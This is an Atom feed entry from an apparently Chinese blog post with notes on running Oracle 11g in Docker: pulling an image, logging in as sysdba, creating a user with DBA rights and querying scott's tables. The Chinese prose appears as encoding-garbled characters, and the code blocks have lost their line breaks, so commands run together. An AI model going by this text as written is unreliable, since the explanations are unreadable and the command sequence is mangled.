    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://juejin.cn/post/7063141828706435085">https://juejin.cn/post/7063141828706435085</a></p><p><a href="https://blog.csdn.net/javaboyweng/article/details/125486242">https://blog.csdn.net/javaboyweng/article/details/125486242</a></p><span id="more"></span><hr><h1 id="dockerå®‰è£…oracle-11g"><a href="#dockerå®‰è£…oracle-11g" class="headerlink" title="dockerå®‰è£…oracle_11g"></a>dockerå®‰è£…oracle_11g</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull iatebes/oracle_11g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¤§æ¦‚5gè¿™æ ·å­ï¼ŒæŒºä¹…çš„</p><p>ç„¶åå¯åŠ¨å®¹å™¨ï¼Œé…ç½®ä¸€ä¸‹ oracle æ•°æ®åº“ç«¯å£åœ¨1521</p><p>è¿›å…¥å®¹å™¨ï¼Œå¿«é€Ÿå¼€å§‹</p><p>åœ¨oracleç”¨æˆ·ä¸‹ï¼Œè¿›å…¥sqlplusï¼Œä½¿ç”¨ sys as sysdba ç™»å½•ï¼Œè§£é” scott ç”¨æˆ·ï¼ŒæŸ¥è¯¢è¡¨æ•°æ®ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> oraclesqlplus /nologconn sys/123456 as sysdba<span class="token comment"># alter user scott account unlock;</span>create user orcltt identified by orcltt<span class="token punctuation">;</span> <span class="token comment">#åˆ›å»ºç”¨æˆ·</span>grant connect,resource,dba to orcltt<span class="token punctuation">;</span> <span class="token comment">#æƒé™</span><span class="token comment"># conn scott/tiger (é»˜è®¤éœ€è¦ä¿®æ”¹å¯†ç ï¼Œé‡å¤è¾“å…¥æ–°è®¾ç½®çš„å¯†ç å³å¯)</span>SQL<span class="token operator">></span> <span class="token keyword">select</span> * from tab<span class="token punctuation">;</span>TNAME                          TABTYPE  CLUSTERID------------------------------ ------- ----------BONUS                          TABLEDEPT                           TABLEEMP                            TABLESALGRADE                       TABLE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/11/08/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE/image-20241108003608841.png" alt="image-20241108003608841"></p><p>å…¶ä¸­çš„æ¯ä¸ªæ•°æ®åº“çš„åå­—éƒ½ä»£è¡¨ç€ä¸€ä¸ªç”¨æˆ·ï¼Œå¦‚scottã€sys</p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7063141828706435085&quot;&gt;https://juejin.cn/post/7063141828706435085&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/javaboyweng/article/details/125486242&quot;&gt;https://blog.csdn.net/javaboyweng/article/details/125486242&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
